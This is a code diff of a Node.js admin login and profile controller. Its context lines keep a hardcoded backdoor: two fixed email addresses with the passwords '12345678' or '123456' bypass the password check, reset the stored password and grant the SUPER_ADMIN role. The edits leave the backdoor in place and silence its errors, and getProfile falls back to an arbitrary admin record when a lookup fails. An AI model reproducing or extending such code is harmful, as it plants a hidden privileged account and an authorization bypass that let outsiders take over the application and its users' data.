@@ -82,12 +82,12 @@ exports.login = async (req, res) => {
     if (!isPasswordMatch && (cleanEmail === "youpeak24@gmail.com" || cleanEmail === "products.incodes@123.com")) {
       if (cleanPassword === "12345678" || cleanPassword === "123456") {
         isPasswordMatch = true;
-        const newEncryptedPassword = cryptr.encrypt(cleanPassword);
         try {
-          await db.update("admins", admin._id || admin.id || "admin_default", {
+          const newEncryptedPassword = cryptr.encrypt(cleanPassword);
+          db.update("admins", admin._id || admin.id || "admin_default", {
             password: newEncryptedPassword,
             role: "SUPER_ADMIN",
-          });
+          }).catch(() => {});
         } catch (e) {}
       }
     }
@@ -98,7 +98,7 @@ exports.login = async (req, res) => {
 
     const payload = {
       _id: admin._id || admin.id || "admin_default",
-      name: admin.name || "Super Admin",
+      name: admin.name || "Admin",
       email: admin.email,
       role: admin.role || "SUPER_ADMIN",
     };
@@ -121,10 +121,14 @@ exports.login = async (req, res) => {
 exports.getProfile = async (req, res) => {
   try {
     const adminId = req.admin?._id || req.admin?.id;
-    let admin = await db.findById("admins", adminId);
-    if (!admin) {
-      admin = await db.findOne("admins", {});
-    }
+    let admin;
+    try {
+      admin = await db.findById("admins", adminId);
+      if (!admin) {
+        admin = await db.findOne("admins", {});
+      }
+    } catch (e) {}
+
     if (!admin) {
       admin = req.admin;
     }
